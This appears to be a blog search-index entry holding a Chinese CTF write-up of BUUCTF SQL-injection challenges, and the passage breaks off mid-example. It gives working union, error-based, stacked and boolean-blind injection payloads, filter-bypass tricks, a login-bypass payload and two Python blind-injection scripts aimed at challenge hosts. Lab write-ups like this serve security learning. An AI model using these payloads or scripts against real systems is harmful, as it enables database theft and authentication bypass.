<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>BUUCTF SQL 刷题</title>
    <link href="/2025/03/12/BUUCTF%20SQL%E5%88%B7%E9%A2%98/"/>
    <url>/2025/03/12/BUUCTF%20SQL%E5%88%B7%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF-SQL-刷题"><a href="#BUUCTF-SQL-刷题" class="headerlink" title="BUUCTF SQL 刷题"></a>BUUCTF SQL 刷题</h1><h1 id="sqltest"><a href="#sqltest" class="headerlink" title="sqltest"></a>sqltest</h1><p>分析流量包，可以看出是布尔型 SQL 盲注的过程，注入语句不再具体分析，这里复习一下 wireshark 的使用</p><p>找到正确时的响应包</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;OusVbMRC4o51aWxF61IcewiPnve.png)</p><p>根据内容长度筛选</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;FrLJbUgCso9fGvxBcohcsnazn8g.png)</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;JGMbbFkWkopOCgxmVEwcUQB2nVf.png)</p><p>响应包中可以看到请求的 url</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;J6zFbtwv7oEN8WxiaR0ce5tZnub.png)</p><p>导出所有符合要求的响应包内容</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;NTDAbbVUbohPwuxFl4Vc8FEmnLe.png)</p><p>写一个脚本正则匹配提取信息并输出 flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;sql.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>flag = [<span class="hljs-string">&quot;&quot;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>)]<br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> f.readlines():<br>    num = re.search(<span class="hljs-string">r&quot;limit%200,1\)\),%20(\d+),%201\)\)&quot;</span>,l)<br>    part = re.search(<span class="hljs-string">r&quot;,%201\)\)&gt;(\d+)]&quot;</span>,l)<br>    <span class="hljs-keyword">if</span> num <span class="hljs-keyword">and</span> part:<br>        flag[<span class="hljs-built_in">int</span>(num.group(<span class="hljs-number">1</span>))] = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(part.group(<span class="hljs-number">1</span>)) + <span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag:&quot;</span>)<br><span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> flag:<br>    <span class="hljs-built_in">print</span>(f,end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><h1 id="BUU-SQL-COURSE"><a href="#BUU-SQL-COURSE" class="headerlink" title="BUU SQL COURSE"></a>BUU SQL COURSE</h1><p>登录未能注入成功，浏览器观察网络模块发现新闻点击时可能存在注入，所以复制 url 开始尝试</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;I4WhbD5rpoJ0qNx7zlJceNGhnme.png)</p><p><code>?id=1 and 1=1</code> 时仍是相同回显</p><p><code>?id=1 and 1=2</code> 时无回显，说明为数字型</p><p><code>?id=1 order by 2</code> 有正常回显，<code>?id=1 order by 3</code> 无，说明为 2 列</p><p><code>?id=-1 union select database(),group_concat(table_name) from information_schema.tables where table_schema=&#39;news&#39;</code> 即可得到数据库名、表名</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;IXUnb4AFSoT7jhxE2Wucs5UQnJe.png)</p><p>后续依次获取列名、内容即可</p><h1 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h1><p>尝试判断闭合类型，结尾使用注释</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;WUQZbgFmrombgMxEdN2cbOhHnof.png)</p><p>在密码 123 处报错，说明密码的闭合方式为双引号且注释未生效，尝试 <code>1&#39; and 1=1 -- -</code></p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;QAJfbgSDFoVJ42x3kbucknkVnTb.png)</p><p>未出现如上报错，注释成功，未出现其他报错，闭合方式正确，输入 <code>1&#39; order by 5 -- -</code> 逐一尝试</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;FNAebYobGomIfrxSZdgcFa6Tnuf.png)</p><p><code>1&#39; order by 4 -- -</code> 时报错，<code>1&#39; order by 3 -- -</code> 未报错，说明 3 列</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;EzxjbooRXoIJgJxb4Ldcs7hgnb1.png)</p><p>输入 <code>1&#39; union select 1,2,3 -- -</code> 判断显示位置，直接结束。</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;JgCrb5IWGoabbixlF4LcIA3Fn5m.png)</p><p><strong>其实直接</strong> <code>1&#39; or 1=1 #</code> <strong>完事……</strong></p><h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><p>输入 <code>1&#39; and 1=1 -- -</code>，显示 do not hack me 发现有过滤，多试几个就发现 and、or、&#x3D;均有过滤，尝试大小写成功绕过。</p><p>输入 <code>1&#39; Order By 3 -- -</code> 无报错，<code>1&#39; Order By 4 -- -</code> 报错，说明共三列</p><p>输入 <code>1&#39; union select 1,2,3 -- -</code> 仍为 wrong user，没发现回显位置</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;AFKxbgFwNo9rcdxYw7kcvwynnAf.png)</p><p>但是发现注释如下（原本就有之前没看到），base32+base64 解密可得明文</p><p><code>select * from user where username = &#39;$name&#39;</code></p><p>那么逻辑应该就是先根据用户名查找，然后再校验密码。</p><p>用户名直接输入 admin，存在该用户，返回 wrong pass</p><p>已知一个用户名后用 union select 去探测一下用户名所在列，输入 <code>1&#39; union select &#39;admin&#39;,2,3 -- -</code> 返回 wrong user，输入 <code>1&#39; union select 1,&#39;admin&#39;,3 -- -</code> 返回 wrong pass，说明用户名位于第二列，可以推测密码即第三列。</p><p>但是后面就不知道怎么搞了，只能去看源码，输入的密码 md5 加密后要与数据库第三列数据一致才能获得 flag。</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;QZ0AbwarKoF7Plx2DRxcfaYknHh.png)</p><p>网上搜索了一下，发现 union 联合查询时如果查询的数据不存在，就会构建一个虚拟的数据，可能这也是为什么 <code>1&#39; union select 1,2,3 -- -</code> 可以探测回显位置，1<del>3 在表内原本不存在，union 查询后先构造了虚拟的 1</del>3 的数据，然后再读取返回到有回显的位置。</p><p>由于是先查询用户名再判断密码是否正确，所以本题可以利用 union 联合查询在用户名处注入，向密码列写入一个 md5 值，然后在密码处输入 md5 对应的明文，那么在查询完用户名后虚拟数据构造完成，判断密码时就将密码栏输入的内容 md5 加密后与虚拟数据的密码列内容比较，也就绕过了原本的密码。</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">例如：                                  （<span class="hljs-number">123</span> md5后的结果）<br>用户：<span class="hljs-number">1</span>&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-symbol">&#x27;admin</span><span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-number">202</span>cb962ac59075b964b07152d234b70&#x27; <span class="hljs-comment">-- -</span><br>密码：<span class="hljs-number">123</span><br></code></pre></td></tr></table></figure><h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><p>逐个尝试发现 and、&#x3D;、&gt;、&lt;、空格、union 均被过滤，双写及大小写均无法绕过，但是存在报错信息，考虑报错注入。</p><p>输入 <code>1&#39;&quot;</code> 报错，<code>use near &#39;&quot;&#39; and password=&#39;123&#39;&#39; at line 1</code>，所以单引号闭合</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;X4Tfb1kbboP7d7xO2FZcfjDrnLb.png)</p><p>输入 <code>1&#39;</code> 报错，输入 <code>1&#39;#</code> 不报错，<code>#</code> 成功注释</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;AJEFbUNbXoXesOx2ykQcF5q9npe.png)</p><p>因为空格被过滤，括号正常，所以可以套括号代替空格。<code>extractvalue()</code> 函数去触发报错，<code>concat()</code> 拼接一下内容。输入 <code>1&#39;or(extractvalue(1,concat(0x7e,database())))#</code>，成功得到数据库名。</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;UwYLbR2kooz1FJx4PMlcDWb8nIh.png)</p><p>这里注意整个 select 语句外面也要套一层括号，用 <code>like</code> 代替 <code>=</code> 继续输入 <code>1&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;geek&#39;)))))#</code>，获得表名。</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;QPlhbUB0totaT5xuGQWcgb42nDh.png)</p><p>稍作修改，继续输入 <code>1&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)))))#</code>，获得列名。</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;Be9PbyEnAoovDnxikzQcsfb0nBc.png)</p><p>稍作修改，继续输入 <code>1&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(username,0x7e,password))from(geek.H4rDsq1)))))#</code>，获得 username 和 password 列的内容。</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;Em56bWLD5oa4vxxfiFfcoaiinzx.png)</p><p>显示不完全，用 <code>substring(str,num1,num2)</code> 函数调整位置，结果发现这个也过滤了，换用 <code>right</code> 尝试 <code>1&#39;or(extractvalue(1,concat(0x7e,right((select(group_concat(username,0x7e,password))from(geek.H4rDsq1)),30))))#</code>，成功，拼接即得 flag。</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;UfYgb6VlWo2S67xoN8GctLwqn2g.png)</p><h1 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h1><p>登录栏测了一下基本都过滤了，选择正确代码发现存在注入，但是 union、and、空格这些过滤了大部分，而且没有回显位，应该就是考布尔盲注。用 python 脚本二分法去跑结果</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">import requests<br>import re<br>import <span class="hljs-built_in">time</span><br><br>url = <span class="hljs-string">&quot;http://df6d4f70-e3c4-46b8-86fb-7d59ae29eb14.node5.buuoj.cn:81/search.php?id=&quot;</span><br>x = <span class="hljs-number">7</span><br>payloads = [<br>    <span class="hljs-comment"># 库长 0</span><br>    <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-comment"># 库名 1</span><br>    <span class="hljs-string">&quot;1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot;</span>,<br>    <span class="hljs-comment"># 表长 2</span><br>    <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-comment"># 表名 3</span><br>    <span class="hljs-string">&quot;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot;</span>,<br>    <span class="hljs-comment"># 列长 4</span><br>    <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-comment"># 列名 5</span><br>    <span class="hljs-string">&quot;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;F1naI1y&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot;</span>,<br><br>    <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-comment"># 内容 7</span><br>    <span class="hljs-string">&quot;1^(ascii(substr((select(group_concat(password))from(geek.F1naI1y)),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot;</span><br>]<br><br>method=<span class="hljs-number">0</span><br><br>keywords = <span class="hljs-string">&quot;ERROR&quot;</span><span class="hljs-comment">#&quot;Click others&quot;</span><br><br>def boolean_query(url,payload):<br>    <span class="hljs-keyword">if</span> method == <span class="hljs-number">0</span>:<br>        r = requests.<span class="hljs-built_in">get</span>(url + payload)<br>    elif method == <span class="hljs-number">1</span>:<br>        r = requests.<span class="hljs-built_in">post</span>(url, payload)<br>    elif method == <span class="hljs-number">2</span>:<br>        r = requests.<span class="hljs-built_in">post</span>(url, json=payload)<br>    <span class="hljs-literal">return</span> keywords <span class="hljs-keyword">in</span> r.<span class="hljs-keyword">text</span>  <span class="hljs-comment"># 这里判断页面是否存在关键字</span><br><br>def get_length(url,payload):<br>    <span class="hljs-keyword">if</span> payload == <span class="hljs-string">&quot;&quot;</span>:<br>        <span class="hljs-literal">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">200</span>):<br>        <span class="hljs-keyword">if</span> boolean_query(url,payload):<br>            <span class="hljs-literal">return</span> i<br>    <span class="hljs-literal">return</span> <span class="hljs-number">0</span><br><br>def get_name(url,<span class="hljs-built_in">length</span>,payload):<br>    results=[]<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">length</span> == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">length</span> = <span class="hljs-number">400</span><br>    name = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">170</span>,<span class="hljs-built_in">length</span>+<span class="hljs-number">1</span>):<br>        low, high = <span class="hljs-number">32</span>, <span class="hljs-number">126</span><br>        <span class="hljs-keyword">while</span> low &lt; high:<br>            <span class="hljs-built_in">time</span>.sleep(<span class="hljs-number">0.1</span>)<br>            <span class="hljs-keyword">mid</span> = (low + high)<span class="hljs-comment"> // 2</span><br>            tmp_payload = payload.<span class="hljs-built_in">format</span>(i=i,<span class="hljs-keyword">mid</span>=<span class="hljs-keyword">mid</span>)<br>            <span class="hljs-keyword">if</span> boolean_query(url,tmp_payload):<br>                low = <span class="hljs-keyword">mid</span> + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                high = <span class="hljs-keyword">mid</span><br>        <span class="hljs-keyword">if</span> low == <span class="hljs-number">32</span>:  <span class="hljs-comment"># ASCII 32 = 空格，表示结束</span><br>            break<br>        name += chr(low)<br>        print(chr(low),<span class="hljs-keyword">end</span>=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-literal">return</span> name<br><br>payload = payloads[x]<br><span class="hljs-built_in">length</span> = get_length(url,payload)<br><span class="hljs-built_in">result</span> = get_name(url,<span class="hljs-built_in">length</span>,payload)<br>print(f<span class="hljs-string">&quot;\n[+] Found : &#123;result&#125;&quot;</span>)<br></code></pre></td></tr></table></figure><p>先跑所有数据库名</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;ZWFubIQemoP1duxlppvcvHzSnrd.png)</p><p>然后跑出 geek 库的表名</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;Uuffb5xTxo7EsbxoYWfc0iy7nRc.png)</p><p>然后跑出 geek 库 Flaaaaag 表的列名</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;Udu9bk5OcoclUxxS6BYcWykInmc.png)</p><p>然后发现被骗了</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;H6aYbClnJoIjYmxPEqUcs7gLnTg.png)</p><p>换 F1naI1y 表跑，大概就这样，内容部分有错误。</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;WQ3sb0fGRoDaZIxTsctc3Pz0n0K.png)</p><h1 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h1><p>输入 1、2 均有结果，空格、+ 被过滤，发现 %20 可替代，and、or、union、information、(group、%20group、均过滤。</p><p>综合考虑，可以用 concat()代替 group_concat()，空格沿用前面一题的括号，information 可以改用 sys.schema_auto_increment_columns 查表，但是再一看题目已经给出 flag 所在表和列了，那就直接爆就好了。按我的注入语句来说，当 Hello, glzjin wants a girlfriend.出现的时候即判断正确，Error Occured When Fetch Result.出现即判断错误，其他即注入语句本身有误。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://23f0fee2-b6ad-4a70-88b9-b13213bde7f9.node5.buuoj.cn:81/index.php&quot;</span><br><br>x = <span class="hljs-number">7</span><br>payloads = [<br>    <span class="hljs-comment"># 库长 0</span><br>    <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-comment"># 库名 1</span><br>    <span class="hljs-string">&quot;0^(ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot;</span>,<br>    <span class="hljs-comment"># 表长 2</span><br>    <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-comment"># 表名 3</span><br>    <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-comment"># 列长 4</span><br>    <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-comment"># 列名 5</span><br>    <span class="hljs-string">&quot;&quot;</span>,<br><br>    <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-comment"># 内容 7</span><br>    <span class="hljs-string">&quot;0^(ascii(substr((select(concat(flag))from(flag)),&#123;i&#125;,1))&gt;&#123;mid&#125;)&quot;</span><br>]<br><br>method=<span class="hljs-number">1</span>               <span class="hljs-comment"># get:0  post+url:1  post+json:2</span><br>parameters_url=&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;        <span class="hljs-comment"># method=1</span><br>target_url=<span class="hljs-string">&quot;id&quot;</span>                 <span class="hljs-comment"># method=1</span><br>parameters_json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>&#125;      <span class="hljs-comment"># method=2</span><br>target_json=<span class="hljs-string">&quot;username&quot;</span>                             <span class="hljs-comment"># method=2</span><br><br>keywords = <span class="hljs-string">&quot;glzjin&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">boolean_query</span>(<span class="hljs-params">url,payload</span>):<br>    <span class="hljs-keyword">if</span> method == <span class="hljs-number">0</span>:<br>        r = requests.get(url + payload)<br>    <span class="hljs-keyword">elif</span> method == <span class="hljs-number">1</span>:<br>        parameters_url[target_url] = payload<br>        r = requests.post(url, data=parameters_url)<br>    <span class="hljs-keyword">elif</span> method == <span class="hljs-number">2</span>:<br>        parameters_json[target_json]=payload<br>        r = requests.post(url, json=parameters_json)<br>    <span class="hljs-keyword">return</span> keywords <span class="hljs-keyword">in</span> r.text  <span class="hljs-comment"># 这里判断页面是否存在关键字</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_length</span>(<span class="hljs-params">url,payload</span>):<br>    <span class="hljs-keyword">if</span> payload == <span class="hljs-string">&quot;&quot;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">200</span>):<br>        <span class="hljs-keyword">if</span> boolean_query(url,payload):<br>            <span class="hljs-keyword">return</span> i<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_name</span>(<span class="hljs-params">url,length,payload</span>):<br>    results=[]<br>    <span class="hljs-keyword">if</span> length == <span class="hljs-number">0</span>:<br>        length = <span class="hljs-number">400</span><br>    name = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,length+<span class="hljs-number">1</span>):<br>        low, high = <span class="hljs-number">32</span>, <span class="hljs-number">126</span><br>        <span class="hljs-keyword">while</span> low &lt; high:<br>            time.sleep(<span class="hljs-number">0.1</span>)<br>            mid = (low + high) // <span class="hljs-number">2</span><br>            tmp_payload = payload.<span class="hljs-built_in">format</span>(i=i,mid=mid)<br>            <span class="hljs-keyword">if</span> boolean_query(url,tmp_payload):<br>                low = mid + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                high = mid<br>        <span class="hljs-keyword">if</span> low == <span class="hljs-number">32</span>:  <span class="hljs-comment"># ASCII 32 = 空格，表示结束</span><br>            <span class="hljs-keyword">break</span><br>        name += <span class="hljs-built_in">chr</span>(low)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(low),end=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-keyword">return</span> name<br><br>payload = payloads[x]<br>length = get_length(url,payload)<br>result = get_name(url,length,payload)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n[+] Found : <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>一开始先查了数据库，后面发现没必要</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;SThibFGh1oDzufxI7Flcvf0hnAe.png)</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;GyP3byDCsoSIwIxCzVhc7X5KnTg.png)</p><h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><p>刚学，先用 BP 和相关字典 fuzz 一下，可以比较高效地探测哪些函数、关键字、符号不可用</p><p>例如本题当输入 <code>select</code> 时直接给出了过滤的范围，联合注入可以排除</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;Lan7bHQDHoQ3ZjxZfkuchz97nbd.png)</p><p>输入 <code>1 or 1=1</code> 时能正常回显</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;T2uWbq5ePoqP3mxBp8OcFk7JnSg.png)</p><p>输入 <code>1&#39; or &#39;1&#39;=&#39;1</code> 时同样正常</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;IYEpbtlTPoe8BJxOxUccDGYnnhp.png)</p><p>这个时候则会报错</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;W9kabh3tTo0Vzqx8uRbconPAn1e.png)</p><p>说明后面还有查询语句，以单引号闭合，所以后面还要补上注释符 <code>1&#39; or 1=1#</code>，此时显示了所有内容</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;H45dbqPdvoQqrqxcB9GcFtednRf.png)</p><p>接下来尝试堆叠注入，要避免直接使用 select 和 where，<code>1&#39;;show databases;#</code> 查看数据库</p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;A7nFbsJaroJVDDxMSlkcrG6anXr.png)</p><p>继续查看表 <code>1&#39;;show tables;#</code></p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;HScpbJe1SofO5vxYmuvcMersn0d.png)</p><p>接下来查看列可以使用 <code>1&#39;; show columns from tableName;#</code> 或 <code>1&#39;;desc tableName;#</code>。注意，<u>如果 tableName 是纯数字，需要用反引号</u>&#96;&#96;&#96;<u>包裹</u>，所以输入 <code>1&#39;;desc </code> 1919810931114514 <code>;#</code></p><p>![](&#x2F;img&#x2F;BUUCTF SQL刷题&#x2F;EdW7blyC1oBOcGxwqCkcWCQrntg.png)</p><p>得到列名后想要获取具体内容一般都需要依靠 select 和 where，这里参考别人总结的四种方法学习尝试一下</p><h2 id="方法一：预编译-字符串拼接绕过"><a href="#方法一：预编译-字符串拼接绕过" class="headerlink" title="方法一：预编译 + 字符串拼接绕过"></a>方法一：预编译 + 字符串拼接绕过</h2><p>通过预编译的方式拼接 select 关键字：<code>1&#39;;PREPARE hacker from concat(&#39;s&#39;,&#39;elect&#39;, &#39; * from </code> 1919810931114514 <code> &#39;);EXECUTE hacker;#</code>。预编译相当于定一个语句相同，参数不同的 Mysql 模板，我们可以通过预编译的方式，绕过特定的字符过滤。之前有学习过通过预编译防御 SQL 注入攻击，但这是第一次用预编译来绕过防护。</p><p>预编译的格式如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">PREPARE</span> 名称 <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">Sql</span>语句 ? ;<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@x</span><span class="hljs-operator">=</span>xx;<br><span class="hljs-keyword">EXECUTE</span> 名称 <span class="hljs-keyword">USING</span> <span class="hljs-variable">@x</span>;<br></code></pre></td></tr></table></figure><p>例如：正常查询使用 <code>SElECT * FROM t_user WHERE USER_ID = 1</code>，预编译则可以如下操作</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql">方法一：<br><span 